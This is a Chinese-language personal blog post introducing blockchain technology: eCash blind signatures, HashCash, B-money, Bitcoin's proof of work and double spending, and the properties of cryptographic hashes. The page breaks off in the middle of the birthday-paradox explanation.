<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>区块链技术 | MingwHuang's Blog</title><meta name="keywords" content="区块链,比特币,以太坊"><meta name="author" content="MingwHuang"><meta name="copyright" content="MingwHuang"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="区块链技术1:比特币八卦 理解中本聪比特币白皮书 理解分布式一致性的概念 了解Paxos和Raft 理解以太坊和智能合约  区块链的货币属性设计一种电子货币，使得它能够像现金一样使用，以及不依赖于第三方组织。首先要考虑：  如何生成货币：谁能获得这个货币，获得货币不能太容易，正如必须工作才能获得报酬； 如何将货币与所有者关联起来：现下的环境中，信用卡实名制，现金匿名； 如何保护交易双方：保护卖家，">
<meta property="og:type" content="article">
<meta property="og:title" content="区块链技术">
<meta property="og:url" content="http://mingwzi.cn/2021/12/21/%E5%8C%BA%E5%9D%97%E9%93%BE/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF/index.html">
<meta property="og:site_name" content="MingwHuang&#39;s Blog">
<meta property="og:description" content="区块链技术1:比特币八卦 理解中本聪比特币白皮书 理解分布式一致性的概念 了解Paxos和Raft 理解以太坊和智能合约  区块链的货币属性设计一种电子货币，使得它能够像现金一样使用，以及不依赖于第三方组织。首先要考虑：  如何生成货币：谁能获得这个货币，获得货币不能太容易，正如必须工作才能获得报酬； 如何将货币与所有者关联起来：现下的环境中，信用卡实名制，现金匿名； 如何保护交易双方：保护卖家，">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202272046348.jpg">
<meta property="article:published_time" content="2021-12-20T20:22:40.000Z">
<meta property="article:modified_time" content="2022-02-22T13:55:23.946Z">
<meta property="article:author" content="MingwHuang">
<meta property="article:tag" content="区块链">
<meta property="article:tag" content="比特币">
<meta property="article:tag" content="以太坊">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202272046348.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://mingwzi.cn/2021/12/21/%E5%8C%BA%E5%9D%97%E9%93%BE/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":500},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: true,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '区块链技术',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-02-22 21:55:23'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.0.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202272113875.JPG" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">40</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">39</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">16</div></a></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202272046348.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">MingwHuang's Blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">区块链技术</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-12-20T20:22:40.000Z" title="发表于 2021-12-21 04:22:40">2021-12-21</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-02-22T13:55:23.946Z" title="更新于 2022-02-22 21:55:23">2022-02-22</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/">区块链</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="区块链技术"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="区块链技术1-比特币八卦"><a href="#区块链技术1-比特币八卦" class="headerlink" title="区块链技术1:比特币八卦"></a>区块链技术1:比特币八卦</h1><ul>
<li>理解中本聪比特币白皮书</li>
<li>理解分布式一致性的概念</li>
<li>了解Paxos和Raft</li>
<li>理解以太坊和智能合约</li>
</ul>
<h2 id="区块链的货币属性"><a href="#区块链的货币属性" class="headerlink" title="区块链的货币属性"></a>区块链的货币属性</h2><p>设计一种电子货币，使得它能够像现金一样使用，以及不依赖于第三方组织。首先要考虑：</p>
<ol>
<li>如何生成货币：谁能获得这个货币，获得货币不能太容易，正如必须工作才能获得报酬；</li>
<li>如何将货币与所有者关联起来：现下的环境中，信用卡实名制，现金匿名；</li>
<li>如何保护交易双方：保护卖家，防止买家对支付进行回滚；保护买家，卖家对交易不能抵赖；</li>
<li>如何防止双花（double-spending）：对于现金不存在双重支付的问题，花出去了，就没有了；如果是基于信用的，有可能重花；现实中，人们不是防止重花而是在检测出重花之后加以重罚。数字货币是完全虚拟的货币，也即一串数字就代表一块币，这个数字可以被无穷次的利用，怎么样能够防止双花呢？</li>
<li>如何记账：每一笔交易有据可查，同时保护用户的隐私；</li>
</ol>
<p>参考文献</p>
<p>【1】<a href="https://link.zhihu.com/?target=https://www.8btc.com/wiki/bitcoin-a-peer-to-peer-electronic-cash-system">比特币白皮书：一种点对点的电子现金系统 | 巴比特</a></p>
<p>【2】<a href="https://link.zhihu.com/?target=http://book.8btc.com/master_bitcoin">精通比特币 | 巴比特图书</a></p>
<p>【3】<a target="_blank" rel="noopener" href="http://daily.zhihu.com/story/9712661">http://daily.zhihu.com/story/9712661</a></p>
<p>【5】 <a href="https://link.zhihu.com/?target=https://tech.sina.com.cn/csj/2019-03-12/doc-ihrfqzkc3149537.shtml">https://tech.sina.com.cn/csj/2019-03-12/doc-ihrfqzkc3149537.shtml</a></p>
<p>【6】<a href="https://link.zhihu.com/?target=https://www.weiyangx.com/327991.html">https://www.weiyangx.com/327991.html</a></p>
<p>【7】<a href="https://link.zhihu.com/?target=http://www.tucaod.com/3990.html">http://www.tucaod.com/3990.html</a></p>
<p>【8】<a href="https://link.zhihu.com/?target=https://www.odaily.com/post/5133445">https://www.odaily.com/post/5133445</a></p>
<h1 id="区块链技术2-电子货币的历史"><a href="#区块链技术2-电子货币的历史" class="headerlink" title="区块链技术2:电子货币的历史"></a>区块链技术2:电子货币的历史</h1><p>主要介绍三种电子货币，分别是eCash、 HashCash和B-money。</p>
<h2 id="eCash"><a href="#eCash" class="headerlink" title="eCash"></a>eCash</h2><p>盲签:一种特殊类型的数字签名。一般数字签名中，签名者知道所签署的消息内容。而在盲签中，签名者对他人（接收者）发来的信息进行签名，接收者首先对原始信息进行盲化，然后发送给签名者；签名者对盲化后的信息进行签名；接收者可以对这个签名后的数据去盲化，最终得到签名者关于原始信息的正确签名。</p>
<p>盲签实例:</p>
<blockquote>
<p>一个托管人想要举行一个秘密的选举，但是投票人不能聚在一起当面匿名投票，只能通过邮寄的方式将选票寄出。每个投票人都非常关心不能泄露自己的投票内容，同时也要求能够确认自己的投票确实用上了。而托管人也希望能够保证只有确定的一些人可以投票。</p>
<p>可以使用一种特殊的信封来实现目的。每个投票人将自己的投票单装入一个复写纸衬底的信封，封好，并且将这个信封装入另外一个大信封，在这个信封的外面有自己的寄回地址。当托管人收到这个有地址的信封时，可以打开大信封，拿出投票人自己封好的有复写纸的信封，然后在不拆封的情况下在信封外签字，此时，通过复写纸，他的签名也传到了投票单上；也即，在不知道投票单具体长什么样的情况下，托管人进行了签字。签好字之后，再将这个有复写纸的信封重新装入一个新的信封，寄回给投票人。投票人可以拆开有复写纸的信封，拿出自己的投票单，然后写好投票内容，在选举的日期寄给托管人，并且不标注任何个人信息。</p>
<p>当托管人收到所有投票人的匿名投票时，他能够通过投票单上的签名确认只有选定的投票人才能投票；而投票人也可以根据只有自己所知道的投票单上的信息（因为投票单是投票人自己所选的）确认自己的投票是否起作用了。</p>
</blockquote>
<p>eCash系统需要有中心银行系统，用户在银行中有存款，可以向银行提取电子货币。为了防止银行系统追踪电子货币的使用情况，用户的隐私情况，可以使用盲签名。分为取款、支付和兑现过程。</p>
<ol>
<li><p>取款过程</p>
<ul>
<li>U （User，用户）用身份认证协议向B（bank，银行）证明身份</li>
<li>U将N份电子现金文件m(内含金额（如100元）、用户ID及唯一的随机数等信息)用不同的盲因子盲化后交给B；（唯一的随机数相当于是现金货币中的编号；）</li>
<li>B随机选择一部分(如：N-1个)文件，向U 索要盲因子，恢复出文件(去盲)，审查内容是否符合要求，如是否所有的文件中都是100元</li>
<li>如果审查通过，B从未审查的文件中任取一份盲签名，并发给U，从U 的帐户中减去相应金额；否则协议终止；（这样，虽然银行对B的100元货币进行了签名，也就是担保，但是银行并不确定B所拥有的货币编号是哪一个，从而无法对用户的消费行为进行跟踪）</li>
<li>U对收到的签名文件去盲，得到电子现金（这个电子现金可以像现金一样使用；而且银行不能追踪；但是用户可以自己保存并记录，以在特殊情况下，证明这张钞票的去向，譬如贿赂等犯罪场景）。</li>
</ul>
</li>
<li><p>支付</p>
<ul>
<li>U 与C交易时，把电子现金交给C</li>
<li>C验证B的签名，如是伪造的，则拒收；否则进一步检测用户(可选)，通过后接受电子现金，提供等价的服务。</li>
</ul>
</li>
<li><p>取款</p>
<ul>
<li>C向B递交电子现金和帐户信息</li>
<li>B验证签名，若是伪造的，则拒收；否则查询数据库是否有相同的签名(防止重复使用电子现金)，若找到则C或U 重用电子现金，拒收；否则接受，在C的帐户中加上相应金额，在数据库中添加签名。</li>
</ul>
</li>
</ol>
<h2 id="HashCash"><a href="#HashCash" class="headerlink" title="HashCash"></a>HashCash</h2><p>维基百科:</p>
<blockquote>
<p>“哈希现金（Hashcash）是一种用于防止垃圾电子邮件和拒绝服务攻击的工作量证明系统，最近以其在比特币（以及其他加密货币）挖矿算法中的应用而闻名，由Adam Back于1997年3月提出。”</p>
</blockquote>
<p>HashCash主要思路:</p>
<p>通过要求在邮件发送之前，必须进行计算，譬如，通过对一封电子邮件进行哈希得到指定的包含一些字符串的散列值，证明为了发送邮件，计算机确实花费了一些时间或能量在特定的算法上，从而“证明”这是合法的邮件。</p>
<p>具体实现:</p>
<p>标题行看起来像这样：</p>
<p><code>X-Hashcash: 1:20:1303030600:adam@cypherspace.org::McMybZIhxKXu57jd:ckvi</code></p>
<p>标题包含:</p>
<ul>
<li>ver：Hashcash格式版本1（取代版本0）。</li>
<li>bits：散列代码中的零的位数。</li>
<li>date：发送消息的时间，格式为YYMMDD [hhmm [ss]]。</li>
<li>resource：接收方，例如IP地址或电子邮件地址。</li>
<li>ext：扩展（可选；在版本1中忽略）。</li>
<li>rand：随机字符串，以base-64格式编码。</li>
<li>counter：二进制计数器，以base-64格式编码。</li>
</ul>
<p>发送方具体操作:</p>
<p>发送方准备标题头并附加上初始化为随机数的计数器值（counter）。然后它计算头的160位SHA-1哈希值。如果散列的前20位（即5个最高有效十六进制数字）都是零，那么这是可接受的标题头。如果不是，则发送方递增计数器并再次尝试散列。在2^160个可能的散列值中，有2^140个散列值满足此标准。因此，随机选择将具有20个零作为散列开头的标题的机会是2^20分之一（2^20大约10^6，或大约百万分之一）。发送者需要尝试以获取有效哈希值的次数符合几何分布模型。因此，发送方平均必须尝试2^20个值才能找到有效的标题头。如果合理估计计算哈希所需的时间，则需要大约一秒钟才能找到。没有比这种暴力破解方法更有效的方法来找到有效的标题头。</p>
<p>普通用户不会因生成Hashcash字符串所需的处理时间而感到明显的问题。但是，垃圾邮件发送者因为发送大量垃圾邮件，会大大减慢速度。</p>
<p>接受者具体操作:</p>
<p>HA-1哈希值（例如，“1：20：060408：<a href="mailto:&#x61;&#x64;&#97;&#x6d;&#x40;&#x63;&#x79;&#112;&#x68;&#101;&#x72;&#x73;&#x70;&#x61;&#99;&#x65;&#x2e;&#x6f;&#114;&#103;">&#x61;&#x64;&#97;&#x6d;&#x40;&#x63;&#x79;&#112;&#x68;&#101;&#x72;&#x73;&#x70;&#x61;&#99;&#x65;&#x2e;&#x6f;&#114;&#103;</a> :: 1QTjaYd7niiQA &#x2F; sc：ePa”）。这在1 GHz机器上大约需要2微秒，远远少于接收其余电子邮件所需的时间。如果前20位不全为零，则散列无效。 （随着机器处理速度的提高，以后的版本可能需要更多的位为零。）</p>
<p>收件人的计算机检查标题中的日期（例如，“060408”，表示2006年4月8日的日期）。如果不在当前日期的两天内，则无效。 （两天的窗口可以补偿不同系统之间的时钟偏差和网络路由时间。）</p>
<p>收件人的计算机检查哈希字符串中的电子邮件地址是否与收件人注册的任何有效电子邮件地址匹配，或者与收件人订阅的任何邮件列表匹配。如果未找到匹配项，则哈希字符串无效。</p>
<p>收件人的计算机将哈希字符串插入数据库。如果字符串已经在数据库中（表示正在尝试重新使用哈希字符串），则该字符串无效。</p>
<p>如果散列字符串通过所有这些测试，则认为它是有效的散列字符串。所有这些测试所花费的时间和磁盘空间远远少于接收电子邮件的正文内容。</p>
<h2 id="B-money"><a href="#B-money" class="headerlink" title="B-money"></a>B-money</h2><p>在B-Money的想法中，Wei提出了两个协议。</p>
<p>在第一个协议中，每个用户都维护一个数据库（<strong>因为每个人都拥有一份数据库，所以中心机构被移除了</strong>），数据库中记录每一个假名（用户的公钥）中有多少钱。这些信息构成了一个帐簿，重点就是如何更新这些帐簿。</p>
<ol>
<li><p>创建钱。每个用户可以通过广播对以前未解决的计算问题的答案来获得钱。这样的计算的条件是必须很容易确定解决这个问题所需要的算力，解题所获得的钱与所付出的算力换算成一篮子货物的价值相等。例如，如果一道题在最经济的的情况下花了100小时的算力，而市场上需要花3篮子的货物来购买这100小时的算力，那么解开这道题产生的货币是3个单位。</p>
</li>
<li><p>转账。如果Alice（公钥A，K_A<em>）</em>决定向Bob（公钥B，K_B）转X单位的钱，那么她发送一条广播消息”我将给K_B X单位的钱“。在广播了这个消息后，系统中的每个用户将K_A用户中的钱扣除X单位；同时将B账户增加X单位。（除非会导致A用户为负）</p>
<blockquote>
<p>进一步解释:</p>
<p>如果Alice和Bob都是都是b-money的用户，那么他们都拥有公私钥对。在非对称密码体系中，公钥是公开的，所有人可见。公钥加密，私钥签名。在所有用户共同维护的账簿中，他们的公钥代表他们的身份。</p>
<p>加入Alice决定向Bob发2个单位的钱，那么Alice就会广播用自己的私钥签名的消息“从K_A发送2个单位的钱到K_B。”这条签名的信息向所有b-money用户证明，公钥A的主人想要将2个单位钱发送给公钥B。因此所有人都会更新他们的账簿。</p>
</blockquote>
</li>
<li><p>合同的影响。有效合同必须包括最大赔偿，以防每个参与方违约。它还应包括一个在发生争议时将进行仲裁的一方。合同的所有各方（包括仲裁员）必须在其生效之前广播其签名。在合同和所有签名的广播之后，每个参与者以其最高赔偿金额借记每一方的账户，并将由合同的安全散列标识的特殊账户记入最大赔偿金额。【也即保存到安全账户】如果每方的借记成功而没有产生负余额，则合同生效，否则合同将被忽略，账户将被回滚。示例合同如下:</p>
<blockquote>
<p>K_A同意在0：0：0 1&#x2F;1&#x2F;2000之前向K_B发送问题P的解。 K_B同意在0：0：0 1&#x2F;1&#x2F;2000之前支付K_A 100 MU（货币单位）。 K_C同意在发生争议时进行仲裁。 K_A同意在违约的情况下支付最多1000 MU。 K_B同意在违约的情况下支付最多200 MU。 K_C同意在违约的情况下支付最多500 MU。</p>
</blockquote>
</li>
<li><p>签订合同。如果合同无争议地结束，则各方广播一条签名消息“与SHA-1哈希H签订的合同无需赔偿即可结束”。或者可能“与SHA-1哈希H的合同以下列赔偿结束：……”在所有签名的广播中，每个参与者按其最高赔偿金额计入每一方的账户，删除合同账户，然后如果存在，则根据赔偿计划对每一方的账户进行贷记或借记。</p>
</li>
<li><p>执行合同。如果合同当事方即使在仲裁员的帮助下也无法就适当的结论达成一致，则每一方都会广播建议的赔偿&#x2F;罚款时间表以及任何有利于他的论据或证据。每个参与者确定实际的赔偿和&#x2F;或罚款，并相应地修改他的账户。</p>
</li>
</ol>
<p>DAi Wei自己提出，这个方案是不可行的，因为它依赖于同步的无阻塞的网络——也即，当Alice发给Bob两个单位的钱之后，如果她立刻又发出一条Alice发给Carol两个单位的钱的消息，那么所有人都能按照顺序接收到这两条消息。而不会出现部分人先收到Bob的消息，部分人先收到Carol的消息，（假设Alice只有两个单位的钱，那么第二条消息不会得到执行），从而造成分布式账本不一致的问题。</p>
<p>为了解决这个问题，Dai Wei提出了另一种方案，提出了部分机器担任服务器，由服务器来保管帐簿的概念。the affected participants of each transaction should verify that the message has been received and successfully processed by a randomly selected subset of the servers，而参与交易的用户需要向随机多个服务器查询，保证信息成功执行。</p>
<p>B-money特点:</p>
<ul>
<li>非常坚定的稳定币价. 在这个系统中，货币的总量没有限制，同时和现实中的一篮子的货物的价格相关联。</li>
</ul>
<p>B-money还没解决的问题:</p>
<ul>
<li>分布式一致性问题</li>
<li>工作量证明</li>
<li>无法追踪的交易</li>
</ul>
<h2 id="比特币"><a href="#比特币" class="headerlink" title="比特币"></a>比特币</h2><p>中本聪（匿名性做的最好的密码朋克的成员）提出的网络具有这样的特点:</p>
<blockquote>
<p>“该网络通过随机散列（hashing）对全部交易加上时间戳（timestamps），将它们合并入一个不断延伸的基于随机散列的工作量证明（proof-of-work）的链条作为交易记录，除非重新完成全部的工作量证明，形成的交易记录将不可更改。最长的链条不仅将作为被观察到的事件序列（sequence）的证明，而且被看做是来自CPU计算能力最大的池（pool）。只要大多数的CPU计算能力都没有打算合作起来对全网进行攻击，那么诚实的节点将会生成最长的、超过攻击者的链条”。</p>
</blockquote>
<p>比特币和B-money都保证了匿名性和可验证性;比特币引入PoW来解决分布式系统中一致性问题</p>
<p>网络运行步骤:</p>
<ol>
<li><p>新的交易向全网进行广播；</p>
</li>
<li><p>每一个节点都将收到的交易信息纳入一个区块中；</p>
</li>
<li><p>每个节点都尝试在自己的区块中找到一个具有足够难度的工作量证明；</p>
</li>
<li><p>当一个节点找到了一个工作量证明，它就向全网进行广播;</p>
<blockquote>
<p>出现分叉怎么处理?</p>
<p>假设甲矿工挖出A链347号块,然后立刻广播,并立刻去挖A链348号块,此时甲矿工收到B链的347号块,他决定先保留,以防B链更长,然后继续A链348号块,然而此时收到B链348号的消息,则甲矿工立刻放弃A链,开始挖B链349号块.此时甲矿工挖出的347号块奖励就没有了,块中所有的交易都放回交易池中,等待后续区块来打包</p>
</blockquote>
</li>
<li><p>当且仅当包含在该区块中的所有交易都是有效的且之前未存在过的，其他节点才认同该区块的有效性；</p>
</li>
<li><p>其他节点表示他们接受该区块，而表示接受的方法，则是在跟随该区块的末尾，制造新的区块以延长该链条，而将被接受区块的随机散列值视为先于新区块的随机散列值。</p>
</li>
</ol>
<p>双重支付问题:</p>
<blockquote>
<p>如果Alice试图用同一笔钱来支付两个交易，那么两个交易不可能都存在于区块链上，因为每一个交易都会被检查；即使Alice强制性地将两个交易都打包进一个区块，其他用户也不会接受包括了不正确交易的区块。如果有两个矿工分别将两笔交易打包进了自己的区块，并且都成功地完成了工作量证明，那么哪一个交易会真正地成为被大家公认的交易就要看运气了。</p>
<p>如果Bob不相信Alice，那么他可以等待Alice的支付消息被成功地打包进了区块，而且在其后又链接更多区块之后，才完成与Alice的交易。譬如Alice向Bob买一本书，按照10分钟生成一个区块的速度，Bob可以等一个小时，也即Alice的支付消息之后有了另外5个区块之后，才将书交给Alice。</p>
</blockquote>
<p>参考文献：</p>
<p>【1】<a href="https://link.zhihu.com/?target=http://www.itianwei.com/p2p/blockchain/2018-07-27/49351.html">DigiCash为什么失败？我们当面问了问“数字货币之父”David Chaum</a></p>
<p>【2】<a href="https://link.zhihu.com/?target=http://blog.sina.com.cn/s/blog_71851c8b0101c3kl.html">盲签名_DNT_EASY_新浪博客</a></p>
<p>【3】<a href="https://link.zhihu.com/?target=http://sceweb.sce.uhcl.edu/yang/teaching/csci5234WebSecurityFall2011/Chaum-blind-signatures.PDF">http://sceweb.sce.uhcl.edu/yang/teaching/csci5234WebSecurityFall2011/Chaum-blind-signatures.PDF</a></p>
<p>【4】<a href="https://link.zhihu.com/?target=http://wwwf.imperial.ac.uk/~rbellovi/writings/chaum.pdf">http://wwwf.imperial.ac.uk/~rbellovi&#x2F;writings&#x2F;chaum.pdf</a></p>
<p>【5】<a href="https://link.zhihu.com/?target=http://blog.koehntopp.de/uploads/chaum_fiat_naor_ecash.pdf">http://blog.koehntopp.de/uploads/chaum_fiat_naor_ecash.pdf</a></p>
<p>【6】<a href="https://link.zhihu.com/?target=http://www.weidai.com/bmoney.txt">http://www.weidai.com/bmoney.txt</a></p>
<p>【7】<a href="https://link.zhihu.com/?target=https://www.8btc.com/article/223424">创世文档：如果说比特币有一个初稿的话，那就是Wei Dai的B-Money</a></p>
<p>【8】<a href="https://link.zhihu.com/?target=https://bitcoinmagazine.com/articles/genesis-files-if-bitcoin-had-first-draft-wei-dais-b-money-was-it/">The Genesis Files: If Bitcoin Had a First Draft, Wei Dai’s B-Money Was It</a></p>
<p>【9】<a href="https://link.zhihu.com/?target=https://www.newyorker.com/magazine/2011/10/10/the-crypto-currency">The Crypto-Currency</a></p>
<p>【10】<a href="https://link.zhihu.com/?target=https://en.wikipedia.org/wiki/Hashcash">https://en.wikipedia.org/wiki/Hashcash</a></p>
<h1 id="区块链技术3-密码学之哈希"><a href="#区块链技术3-密码学之哈希" class="headerlink" title="区块链技术3:密码学之哈希"></a>区块链技术3:密码学之哈希</h1><p>《比特币白皮书》:</p>
<blockquote>
<p>“所以，我们非常需要这样一种电子支付系统，它基于密码学原理而不基于信用，使得任何达成一致的双方，能够直接进行支付，从而不需要第三方中介的参与。”</p>
</blockquote>
<h2 id="哈希"><a href="#哈希" class="headerlink" title="哈希"></a>哈希</h2><p>加密哈希（cryptographic hash）:</p>
<blockquote>
<p>加密哈希是哈希函数的一种，它具有某些属性，使其适用于加密。通过加密哈希，它将任意大小的数据映射到固定大小的位串（散列），并被设计为单向函数，即一个不可逆的函数。从理想的加密散列函数输出重新创建输入数据的唯一方法是尝试对可能的输入进行暴力搜索，以查看它们是否产生匹配，或使用匹配哈希的彩虹表(里面记录了常见的hash值对应的内容)。布鲁斯施奈尔称单向散列函数是“现代密码学的主力”。输入数据通常称为消息（Message），输出（散列值或散列）通常称为消息摘要或简称为摘要（Digest）。</p>
</blockquote>
<p>理想的加密哈希函数有五个主要属性：</p>
<ol>
<li>确定性的。</li>
</ol>
<p>常见的哈希函数都满足这个特性。（只要计算过程中没有引入随机数&#x2F;调度，应该都满足？）</p>
<ol start="2">
<li>快速计算</li>
</ol>
<p>SHA-256算法的主要操作时异或运算，位运算非常快。</p>
<ol start="3">
<li>Hiding</li>
</ol>
<p>hiding就是知道哈希的结果不能倒推输入。简单来说，譬如 x mod 100这样的哈希函数，如果结果是1，那么x可能是1、101、201等无穷的数。从SHA族算法，从结果完全得不到输入的任何信息。</p>
<ol start="4">
<li><p>雪崩效应</p>
</li>
<li><p>抗冲突（collision-resistance）</p>
<p>当两个输入产生同一个输出，就发生了冲突。这里的抗冲突不是说肯定不会冲突，由鸽笼原理很容易看出，只要定义域大于值域，肯定会有冲突的。哈希函数的抗冲突指的是，虽然冲突就在那里，那就是找不到——或者说在可接受的时间内找不到。</p>
</li>
</ol>
<p>哈希函数在密码学中有着“瑞士军刀”的作用，有各种应用。</p>
<p>接下来，我们重点讨论三个特点：抗冲突、隐藏以及puzzle friendliness，以及它们的应用。</p>
<h3 id="抗冲突"><a href="#抗冲突" class="headerlink" title="抗冲突"></a>抗冲突</h3><ol>
<li><p><strong>抗冲突是指不可能找到两个x和y，其中x 不等于 y，而</strong> $H(x)&#x3D;H(y)$ 。</p>
<p>注意这里说的是不可能找到，而不是说不存在。实际上根据鸽笼原理，对于输出是256比特的SHA-256，那么只要找到2^256+1的输入，肯定可以找到至少两个值有冲突。</p>
<p>上面的方法是肯定可以找到冲突，把复杂度降低一点，利用生日攻击原理，如果随机挑选2^130+1的输入，有99.8%的概率可以找到冲突。</p>
<blockquote>
<p>生日悖论：生日悖论是指在不少于 23 个人中至少有两人生日相同的概率大于 50%。例如在一个 30 人的小学班级中，存在两人生日相同的概率为 70%。对于 60 人的大班，这种概率要大于 99%。这个数学事实十分反直觉，故称之为一个悖论。生日悖论的数学理论被应用于设计密码学攻击方法——生日攻击。<br>为什么是23呢？通过概率来计算一下。<br>假设房间中有n个人，那么n个人生日全部不相同的概率是:</p>
<p>$1*\frac{364}{365}*\frac{363}{365}*\frac{362}{365}…*\frac{365-n+1}{365}$至少有两个人相同的概率就是1-上述概率，计算得出的n和概率的关系是：</p>
</blockquote>
</li>
</ol>
<blockquote>
